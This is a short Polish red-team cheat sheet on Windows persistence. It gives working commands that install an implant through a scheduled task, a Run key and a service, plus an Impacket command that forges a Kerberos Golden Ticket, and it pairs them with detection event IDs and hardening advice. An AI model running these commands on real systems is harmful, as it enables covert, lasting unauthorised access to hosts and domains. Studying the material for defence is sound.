---
title: "Windows Persistence"
category: "red-team"
tags: ["persistence", "windows"]
platform: "windows"
mitre: ["T1547", "T1053.005", "T1136"]
difficulty: "intermediate"
updated: "2026-07-11"
author: "core"
---

# Windows Persistence

## TL;DR
Autostart (Run keys), zadania harmonogramu, usługi, WMI event subs, startup folder. AD: Golden/Silver Ticket, DCSync, AdminSDHolder.

## Lokalne
```powershell
# Scheduled task
schtasks /create /tn "Updater" /tr "C:\Windows\Temp\impl.exe" /sc onlogon /ru SYSTEM

# Run key
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Upd /d "C:\...\impl.exe"

# Usługa
sc create updater binpath= "C:\...\impl.exe" start= auto

# WMI event subscription (fileless, przetrwa reboot)
# __EventFilter + __EventConsumer + FilterToConsumerBinding
```

## Domenowe (po przejęciu)
```text
Golden Ticket   – TGT podpisany hashem krbtgt (dowolny user, dowolne uprawnienia)
Silver Ticket   – TGS dla konkretnej usługi (hash konta usługi/hosta)
DCSync rights   – nadanie replikacji low-priv userowi -> zrzut haseł na żądanie
AdminSDHolder   – modyfikacja ACL -> odtwarzane co 60 min na chronionych grupach
```
```bash
# Golden ticket (Impacket)
impacket-ticketer -nthash <krbtgt_hash> -domain-sid S-1-5-21-... -domain corp.local administrator
```

## Wykrywanie (Blue Team)
- Event **7045** (usługa), **4698** (task), Run-key zmiany, WMI **5861**.
- Golden Ticket: TGT z nietypowo długim lifetime / nieistniejący user; brak 4768 przy 4769.
- **4720** (nowe konto), zmiany ACL AdminSDHolder.

## Mitygacja / Hardening
- Regularna rotacja **krbtgt** (2×), monitoring WMI subs, autostart baseline.
- Ochrona kont Tier 0, alerty na DCSync (4662 z prawami replikacji dla nie-DC).

## Źródła
- [MITRE Persistence](https://attack.mitre.org/tactics/TA0003/)
